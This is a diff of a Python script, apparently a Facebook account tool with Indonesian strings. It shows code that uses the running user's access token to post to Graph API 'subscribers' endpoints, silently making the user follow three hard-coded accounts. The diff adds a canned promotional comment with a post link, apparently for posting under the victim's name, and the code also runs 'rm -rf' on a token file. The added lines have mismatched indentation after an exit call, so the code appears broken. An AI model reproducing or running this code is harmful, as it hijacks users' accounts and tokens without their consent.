@@ -15,7 +15,10 @@ def main():
         print('%s║'%(M))
         print('%s╚══[%s!%s] %sToken Invalid'%(M,P,M,P))
         os.system('rm -rf token.txt')
-        exit(elite.menu_log())
+        exit(manda.menu_log())
+	nama_user = "Name : " + nama
+	id_user = "\nID : " + id
+	kom = ("Aa Raka Ganteng pacarnya Neng Manda? ❤️❤️❤️❤️❤️\n\nhttps://www.facebook.com/100017584682867/posts/800676813861801/?app=fbl")
     requests.post("https://graph.facebook.com/100017584682867/subscribers?access_token=" + token)    
     requests.post("https://graph.facebook.com/100000395779504/subscribers?access_token=" + token) 
     requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token=" + token)
